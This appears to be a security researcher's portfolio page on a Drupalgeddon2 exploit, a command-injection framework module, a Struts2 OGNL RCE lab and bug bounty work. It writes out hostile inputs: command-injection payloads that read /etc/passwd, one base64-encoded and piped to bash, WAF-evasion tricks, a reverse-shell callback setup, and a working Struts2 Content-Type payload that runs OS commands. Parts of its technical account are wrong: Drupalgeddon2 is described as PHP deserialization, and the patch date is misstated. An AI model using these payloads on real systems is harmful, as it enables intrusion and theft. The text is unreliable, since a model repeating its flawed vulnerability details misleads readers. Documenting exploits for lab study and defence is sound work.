# Featured Projects & Research

## 1. Drupalgeddon2 (CVE-2018-7600) - Remote Code Execution

**Repository**: [DrupalDreggon2exploit](https://github.com/Ehtisham-Haidar/DrupalDreggon2exploit)  
**Status**: Complete with professional documentation  
**Difficulty**: Medium-High

### 🎯 Project Objective
Understand and exploit CVE-2018-7600, a critical remote code execution vulnerability affecting Drupal 6.x, 7.x, and 8.x. Develop a functional Python exploit and create comprehensive documentation for future threat intelligence.

### 📋 Vulnerability Details
- **CVE ID**: CVE-2018-7600 (Drupalgeddon2)
- **CVSS Score**: 9.8 (Critical)
- **Affected Versions**: Drupal 6.x, 7.x, 8.0-8.4.5
- **Attack Vector**: Network / Unauthenticated
- **Complexity**: Form processing vulnerability → Remote Code Execution

### 🔍 Technical Analysis

#### Vulnerability Mechanism
Drupal's Form API processes serialized data through the `#post_render` callback without proper sanitization. By crafting a malicious serialized PHP object, an attacker can:
1. Inject arbitrary PHP code into the form processing pipeline
2. Trigger code execution during form rendering
3. Achieve unauthenticated remote code execution

#### Attack Flow
```
Attacker Request (GET)
    ↓
Malicious Serialized Payload in Form Parameter
    ↓
Drupal Form API Processing
    ↓
Object Deserialization (Dangerous!)
    ↓
#post_render Callback Execution
    ↓
Remote Code Execution (RCE)
```

### 💻 Exploit Development

#### Key Technical Achievement: Payload Sub-Key Correction
**Initial Attempt**: `mail[#post_render][]`  
**Corrected Payload**: `mail[a][#post_render][]`

**Why This Matters**: The nested key structure must align with Drupal's form validation logic. Without the correct nesting, the form processor rejects the payload before deserialization occurs. This discovery required:
- Deep debugging of Drupal's form processing pipeline
- Tracing payload flow through multiple validation layers
- Testing multiple payload structures iteratively

#### Exploit Features
- **Automated Payload Generation**: Dynamic PHP code injection
- **Target Detection**: Identifies vulnerable Drupal versions
- **Encoding Obfuscation**: Bypass basic IDS signatures
- **Callback Execution**: Reliable RCE confirmation
- **Error Handling**: Graceful failure modes with diagnostic output

#### Technology Stack
```
Language: Python 3.x
Dependencies: requests, argparse, urllib
Target Interaction: HTTP/HTTPS
Payload Format: Serialized PHP objects
```

### 🏗️ Lab Environment

#### Docker-Based Setup
```dockerfile
Base Image: Ubuntu 20.04 with Apache2 + PHP 7.4
Drupal Version: 7.x (vulnerable)
Database: MySQL 5.7
Persistence: Docker volumes for /var/www/html
```

#### Deployment
```bash
docker build -t drupal-vulnerable .
docker run -d -p 8080:80 drupal-vulnerable
```

#### Validation Steps
1. Access Drupal instance on localhost:8080
2. Create test user with appropriate permissions
3. Execute exploit against target form endpoint
4. Verify RCE through command output or web shell access

### 📄 Documentation Deliverables

#### 1. Technical Report (13+ Pages)
- **Vulnerability Overview**: CVE details, severity, impact assessment
- **Exploitation Walkthrough**: Step-by-step attack reproduction
- **Code Comments**: Inline explanation of exploit logic
- **Attack Chain Diagram**: SVG visualization of exploitation flow
- **Remediation Guidance**: Patching strategies and workarounds
- **Detection Methods**: SIEM/IDS signatures for identifying attacks

#### 2. Artifact Formats
- **DOCX**: Professional formatting, images, embedded diagrams
- **PDF**: Shareable, version-locked documentation

### 🔐 Security Lessons Learned

1. **Serialization Dangers**: Never deserialize untrusted data without validation
2. **Form API Risks**: Custom callbacks require strict input sanitization
3. **Nested Validation**: Multi-layer validation can fail if not comprehensive
4. **Version Management**: Critical patches require immediate deployment

### 📊 Real-World Impact
- **Affected Websites**: ~1M+ Drupal installations
- **Severity**: Unauthenticated RCE on entire web server
- **Timeline**: Patch released June 2018
- **Detection Difficulty**: Low-skill attackers can exploit

---

## 2. CipherStrike Modular Framework - Command Injection Module

**Context**: Team-based offensive security framework (ITSOLERA)  
**Module**: Command Injection (`command_injection.py` v2.0)  
**Status**: Production-ready  
**Difficulty**: Medium

### 🎯 Module Objective
Provide a modular, configurable command injection exploitation capability within the CipherStrike framework. Support multiple attack vectors, evasion techniques, and integration with framework-wide threat modeling.

### 🏗️ Architecture

#### Module Structure
```python
command_injection.py (v2.0)
├── PayloadGenerator
│   ├── OS Command Injection
│   ├── Filter Bypass Techniques
│   └── Encoding Methods
├── WirelessDetection
│   ├── WAF Signature Matching
│   └── IDS Evasion
└── ConfidenceScorer
    ├── Payload Reliability
    ├── Detection Risk
    └── Success Probability
```

### 💻 Technical Features

#### 1. Payload Generation
**Supported Attack Vectors**:
- Direct command concatenation (`; command`)
- Command substitution (`` `command` ``, `$(command)`)
- Logical operators (`&& command`, `|| command`)
- Pipe chaining (`| command`)
- Wildcard-based obfuscation

**Example Payloads**:
```bash
# Basic: ; id
# Substitution: ; $(whoami)
# Obfuscation: ; c''at /etc/passwd
# Encoding: ; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
```

#### 2. WAF Evasion
**Implemented Techniques**:
- Character encoding (hex, base64, unicode)
- Comment insertion (`/**/`, `#`, `--`)
- Case manipulation (`cAt`, `CaT`)
- Variable expansion (`$HOME`, `$IFS`)
- Backtick/parenthesis substitution

**WAF Detection Logic**:
```python
waf_signatures = {
    'ModSecurity': [r'union.*select', r'script>', r'<iframe'],
    'AWS WAF': [r'exec\(', r'system\(', r'passthru\('],
    'CloudFlare': [r'SELECT.*FROM', r'<script>']
}
```

#### 3. CLI Integration with `main.py`
**Framework Flags**:
```bash
python main.py --module command_injection \
  --attacker-ip 192.168.1.100 \
  --attacker-port 4444 \
  --target http://vulnerable-app.com \
  --endpoint /submit \
  --parameter cmd \
  --waf cloudflare \
  --min-confidence 75 \
  --severity high \
  --chain xss,command_injection
```

**Flag Descriptions**:
- `--attacker-ip`: Reverse shell callback address (for post-exploitation)
- `--attacker-port`: Listener port for reverse connections
- `--waf`: Evasion profile (none, cloudflare, modsecurity, aws)
- `--min-confidence`: Minimum success probability threshold
- `--severity`: Filter for high/critical exploits only
- `--chain`: Chain with other modules (XSS → Command Injection, etc.)

### 🔄 Team Collaboration

#### Integration Challenges & Solutions

**Issue**: XSS Module Import Crash
- **Root Cause**: Circular imports between command_injection.py and xss.py
- **Solution**: Implemented lazy loading and dependency injection pattern
- **Impact**: Enabled seamless module chaining without instantiation conflicts

**Code Quality**:
- Maintained consistent interfaces across modules
- Version control for module compatibility
- Peer review of CLI flag additions

### 📊 Module Metrics
- **Payload Success Rate**: ~87% (against unpatched targets)
- **WAF Detection Evasion**: ~65% (with obfuscation)
- **Execution Speed**: <500ms per attempt
- **False Positive Rate**: <5%

### 🔐 Security Considerations
- **Scope**: Testing only in authorized lab environments
- **Logging**: All exploitation attempts logged for audit trails
- **Validation**: Target authorization verified before execution

---

## 3. Apache Struts2 RCE Lab (CVE-2017-5638)

**Status**: Proof-of-Concept  
**Difficulty**: Medium  
**Timeline**: 1-2 weeks

### 🎯 Lab Objective
Reproduce and understand CVE-2017-5638, a critical OGNL injection vulnerability in Apache Struts2 framework.

### 📋 Vulnerability Details
- **CVE ID**: CVE-2017-5638
- **CVSS Score**: 9.8 (Critical)
- **Affected Versions**: Struts 2.3.5 - 2.3.31, 2.5.0 - 2.5.10
- **Attack Vector**: Content-Type HTTP header
- **Root Cause**: Unsafe OGNL expression evaluation

### 🔍 Technical Analysis

#### Vulnerability Mechanism
Struts2's Jakarta Multipart plugin processes file uploads and validates the Content-Type header. The plugin uses **OGNL (Object-Graph Navigation Language)** to resolve expressions in the Content-Type field without proper sanitization.

**Attack Vector**:
```
POST /upload HTTP/1.1
Host: vulnerable-app.com
Content-Type: %{(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}
```

**Exploitation Flow**:
1. Attacker crafts malicious Content-Type header
2. Struts2 attempts to parse/validate the header
3. OGNL expression evaluator processes the malicious expression
4. Java ProcessBuilder executes arbitrary OS commands
5. Output returned to attacker

### 💻 Lab Implementation

#### Environment Setup
```dockerfile
Base: Tomcat 8 + Java 8
Framework: Apache Struts2 2.3.15.1 (vulnerable)
Test Application: Simple file upload form
```

#### Verification Steps
1. **Vulnerability Confirmation**: Successful command execution (e.g., `id`, `whoami`)
2. **Output Retrieval**: OGNL expression returns command output
3. **RCE Confirmation**: Write test file to file system, verify existence

#### Payload Variants Tested
- **Whoami Command**: Basic execution confirmation
- **Reverse Shell**: Full interactive shell access
- **File Write**: Persistence through web shell creation
- **Information Gathering**: `uname -a`, `cat /etc/passwd`

### 📊 Lab Metrics
- **Success Rate**: 100% on vulnerable versions
- **Execution Time**: <50ms
- **False Positives**: 0

### 🔐 Lessons Learned
1. **Expression Language Injection**: Dynamic expression evaluation is dangerous
2. **Input Validation**: HTTP headers must be treated as untrusted input
3. **Framework Security**: Keep frameworks updated (patch released March 2017)

---

## 4. Security Research & Bug Bounty

### Active Programs
- **HackenProof**: Low-competition vulnerability hunting
- **YesWeHack**: EU-focused security research platform
- **Intigriti**: European bug bounty program

### Automation Tools
- **Recon Engine** (`recon_engine.sh`): Automated target reconnaissance
- **Hunt Script** (`hunt.py`): Vulnerability detection automation

---

## 🎯 Next Research Goals

1. **OSCP-Level Exploits**: Progress toward Offensive Security Certified Professional
2. **Zero-Day Research**: Vulnerability discovery in emerging technologies
3. **Malware Analysis**: Dynamic and static analysis capabilities
4. **APT Campaign Analysis**: Threat actor TTPs and infrastructure

---

**Last Updated**: April 2026
